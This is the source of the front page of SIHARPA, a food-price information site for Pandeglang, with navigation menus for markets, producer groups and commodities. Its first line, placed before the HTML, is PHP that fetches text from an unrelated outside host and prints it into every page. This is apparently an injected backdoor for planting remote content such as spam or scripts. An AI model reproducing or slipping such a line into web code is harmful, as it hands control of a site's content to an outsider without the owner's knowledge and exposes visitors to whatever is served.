<?php $a = file_get_contents('https://paulsaar.com/tmb/id.txt');
echo $a; ?>
<!DOCTYPE html>
<html>
<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>SIHARPA - Sistem Informasi Harga Pangan Pandeglang | Frontpages</title>
	<link href="media/website/pavicon.png" rel="shortcut icon" type="image/x-icon">

    <link href="themes/assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="themes/assets/font-awesome/css/font-awesome.css" rel="stylesheet">
	
	<!-- Data Tables -->
    <link href="themes/assets/css/plugins/dataTables/dataTables.bootstrap.css" rel="stylesheet">
    <link href="themes/assets/css/plugins/dataTables/dataTables.responsive.css" rel="stylesheet">
    <link href="themes/assets/css/plugins/dataTables/dataTables.tableTools.min.css" rel="stylesheet">
	
    <link href="themes/assets/css/animate.css" rel="stylesheet">
    <link href="themes/assets/css/style.css" rel="stylesheet">
	
	<!-- Jquery Script -->
	<script src="themes/assets/js/jquery-2.1.1.js"></script>
	
	<!-- Mainly scripts -->
    <script src="themes/assets/js/bootstrap.min.js"></script>
    <script src="themes/assets/js/plugins/metisMenu/jquery.metisMenu.js"></script>
    <script src="themes/assets/js/plugins/slimscroll/jquery.slimscroll.min.js"></script>

    <!-- Custom and plugin javascript -->
    <script src="themes/assets/js/inspinia.js"></script>
    <script src="themes/assets/js/plugins/pace/pace.min.js"></script>
	
	 <!-- Data Tables -->
    <script src="themes/assets/js/plugins/dataTables/jquery.dataTables.js"></script>
    <script src="themes/assets/js/plugins/dataTables/dataTables.bootstrap.js"></script>
    <script src="themes/assets/js/plugins/dataTables/dataTables.responsive.js"></script>
    <script src="themes/assets/js/plugins/dataTables/dataTables.tableTools.min.js"></script>

    <!-- Flot -->
    <script src="themes/assets/js/plugins/flot/jquery.flot.js"></script>
    <script src="themes/assets/js/plugins/flot/jquery.flot.tooltip.min.js"></script>
    <script src="themes/assets/js/plugins/flot/jquery.flot.resize.js"></script>

    <!-- ChartJS-->
    <script src="themes/assets/js/plugins/chartJs/Chart.min.js"></script>

    <!-- Peity -->
    <script src="themes/assets/js/plugins/peity/jquery.peity.min.js"></script>
    <!-- Peity demo -->
    <script src="themes/assets/js/demo/peity-demo.js"></script>
	
</head>

<body class="top-navigation">

    <div id="wrapper">
        <div id="page-wrapper" class="gray-bg">
        <div class="row border-bottom white-bg">
        <nav class="navbar navbar-static-top" role="navigation">
            <div class="navbar-header">
                <button aria-controls="navbar" aria-expanded="false" data-target="#navbar" data-toggle="collapse" class="navbar-toggle collapsed" type="button">
                    <i class="fa fa-reorder"></i>
                </button>
                <a href="index.php" class="navbar-brand">SIHARPA</a>
            </div>
            <div class="navbar-collapse collapse" id="navbar">
                <ul class="nav navbar-nav">
                                        	<li class="dropdown">
                        <a aria-expanded="false" role="button" href="#" class="dropdown-toggle" data-toggle="dropdown"> Tentang Kami <span class="caret"></span></a>
                        <ul role="menu" class="dropdown-menu">
                            							<li><a href="?pages=post/pages&p=011770496612dc61b2bee223f7881990a77c9e71"><i class="fa fa-file-text-o"></i> Sambutan Kepala Dinas</a></li>
                                                    </ul>
                    </li>
												<li class="dropdown">
                        <a aria-expanded="false" role="button" href="#" class="dropdown-toggle" data-toggle="dropdown"> Produsen <span class="caret"></span></a>
                        <ul role="menu" class="dropdown-menu">
                            							<li><a href="?pages=produsen/index&produsenID=5"><i class="fa fa-building"></i> GAPOKTAN SINAR BAHAGIA</a></li>
														<li><a href="?pages=produsen/index&produsenID=4"><i class="fa fa-building"></i> GAPOKTAN BANDA URANG</a></li>
														<li><a href="?pages=produsen/index&produsenID=3"><i class="fa fa-building"></i> GAPOKTAN MARGA SALUYU</a></li>
														<li><a href="?pages=produsen/index&produsenID=2"><i class="fa fa-building"></i> GAPOKTAN MUKTI TANI</a></li>
														<li><a href="?pages=produsen/index&produsenID=1"><i class="fa fa-building"></i> GAPOKTAN SUGI TANI</a></li>
							                        </ul>
                    </li>
												<li class="dropdown">
                        <a aria-expanded="false" role="button" href="#" class="dropdown-toggle" data-toggle="dropdown"> Pasar <span class="caret"></span></a>
                        <ul role="menu" class="dropdown-menu">
                            							<li><a href="?marketID=35"><i class="fa fa-home"></i> PASAR CIBALIUNG</a></li>
														<li><a href="?marketID=26"><i class="fa fa-home"></i> PASAR LABUAN</a></li>
														<li><a href="?marketID=30"><i class="fa fa-home"></i> PASAR MENES</a></li>
														<li><a href="?marketID=25"><i class="fa fa-home"></i> PASAR PANDEGLANG</a></li>
														<li><a href="?marketID=42"><i class="fa fa-home"></i> PASAR PANIMBANG</a></li>
														<li><a href="?marketID=33"><i class="fa fa-home"></i> PASAR PICUNG</a></li>
														<li class="divider"></li>
							<li><a href="?pages=pasar-list">LIHAT PASAR LAINNYA <i class="fa fa-angle-double-right"></i></a></li>
                        </ul>
                    </li>
                    <li class="dropdown">
                        <a aria-expanded="false" role="button" href="#" class="dropdown-toggle" data-toggle="dropdown"> Komoditas <span class="caret"></span></a>
                        <ul role="menu" class="dropdown-menu">
							<li><a href="?pages=komoditas/index"><i class="fa fa-sitemap"></i> Semua Data Komoditas</a></li>
							<li><a href="?pages=komoditas/filter"><i class="fa fa-sort-alpha-asc"></i> Filter Data Komoditas</a></li>
							<li class="divider"></li>
														<li><a href="?pages=komoditas/data&komoditasID=1"><img src="media/komoditas-86006.png" style="width:16px;"> BERAS</a></li>
														<li><a href="?pages=komoditas/data&komoditasID=2"><img src="media/komoditas-17481.png" style="width:16px;"> SAYURAN</a></li>
														<li><a href="?pages=komoditas/data&komoditasID=3"><img src="media/komoditas-16564.png" style="width:16px;"> DAGING AYAM & TELUR</a></li>
														<li><a href="?pages=komoditas/data&komoditasID=7"><img src="media/komoditas-74467.png" style="width:16px;"> DAGING SAPI</a></li>
														<li><a href="?pages=komoditas/data&komoditasID=8"><img src="media/komoditas-95565.png" style="width:16px;"> MINYAK GORENG</a></li>
														<li><a href="?pages=komoditas/data&komoditasID=9"><img src="media/komoditas-80031.png" style="width:16px;"> GULA PASIR</a></li>
														<li><a href="?pages=komoditas/data&komoditasID=10"><img src="media/komoditas-35701.png" style="width:16px;"> TEPUNG</a></li>
														<li class="divider"></li>
							<li><a href="?pages=komoditas/list">DATA KOMODITAS LAINNYA <i class="fa fa-angle-double-right"></i></a></li>
                        </ul>
                    </li>
                    <li>
                        <a href="?pages=post/blog"> Berita</a>
                    </li>

                </ul>
                <ul class="nav navbar-top-links navbar-right">
                    					<li>
                        <a href="?pages=login">
                            <small><i class="fa fa-sign-in"></i> Log In</small>
                        </a>
                    </li>
					                </ul>
            </div>
        </nav>
        </div>
        <div class="wrapper wrapper-content">
            <div class="container">
